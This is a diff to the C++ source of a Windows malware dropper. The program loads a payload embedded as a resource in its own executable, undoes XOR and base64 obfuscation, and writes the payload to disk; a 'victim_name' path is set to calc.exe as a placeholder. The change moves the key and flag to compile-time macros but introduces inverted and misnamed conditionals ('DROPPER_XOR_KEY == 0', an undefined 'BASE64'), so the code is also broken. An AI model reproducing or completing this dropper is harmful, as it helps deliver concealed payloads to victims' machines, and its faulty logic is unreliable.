@@ -4,6 +4,15 @@
 
 // Required Imports
 #define _CRT_SECURE_NO_WARNINGS
+
+#ifndef DROPPER_XOR_KEY
+#define DROPPER_XOR_KEY 0
+#endif
+
+#ifndef DROPPER_BASE64
+#define DROPPER_BASE64 false
+#endif
+
 #include<iostream>
 #include<stdio.h>		// Debug Prints
 #include<cstdint>
@@ -49,22 +58,11 @@ char name[10 * NAME_SIZE];
 // (char*) C:\\example\\path\\to\\your\\payload.exe
 char* victim_name = (char*) "C:\\Windows\\System32\\calc.exe";
 
-int xor_key;
-
-char* env;
-
-bool base64;
-
 // Entry Point
 int main(int argc, char* argv[])
 {
 
-	xor_key = atoi(getenv("DROPPER_XOR_KEY"));
-
-	env = getenv("DROPPER_BASE64");
-	base64 = (env && strcmp(env, "true") == 0);
-
-	printf("The xor key is: %d. The base64 is: %d\n", xor_key, base64);
+	printf("The xor key is: %d. The base64 is: %d\n", DROPPER_XOR_KEY, DROPPER_BASE64);
 
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
@@ -78,16 +76,16 @@ int main(int argc, char* argv[])
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
 
-	if (xor_key != 0){
+	#if DROPPER_XOR_KEY == 0
 		std::cout << "Xor has been run!\n";
 		data = XOR(data, size);
-	}
+	#endif
 
-	if (base64 == true){
+	#if BASE64 == false
 		std::cout << "Base64 has been run!\n";
 		data = base64decode(data, &size);
-	}
 
+	#endif
 	// where to drop
 	set_name();
 	// Drop to Disk
